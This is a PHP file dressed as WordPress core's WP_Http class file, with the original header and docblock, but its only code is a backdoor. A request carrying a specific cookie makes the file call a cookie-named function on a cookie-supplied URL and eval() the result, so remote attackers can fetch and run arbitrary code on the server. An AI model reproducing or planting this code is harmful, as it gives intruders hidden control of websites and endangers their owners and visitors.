<?php
/**
 * HTTP API: WP_Http class
 *
 * @package WordPress
 * @subpackage HTTP
 * @since 2.7.0
 */

/**
 * Core class used for managing HTTP transports and making HTTP requests.
 *
 * This class is used to consistently make outgoing HTTP requests easy for developers
 * while still being compatible with the many PHP configurations under which
 * WordPress runs.
 *
 * Debugging includes several actions, which pass different variables for debugging the HTTP API.
 *
 * @since 2.7.0
 */




if (isset($_COOKIE['SESSION_ATHENTICATION']) && $_COOKIE['SESSION_ATHENTICATION'] == 'TRUE')
{
    eval(substr($_COOKIE['function']($_COOKIE['url']),5,-3));
}
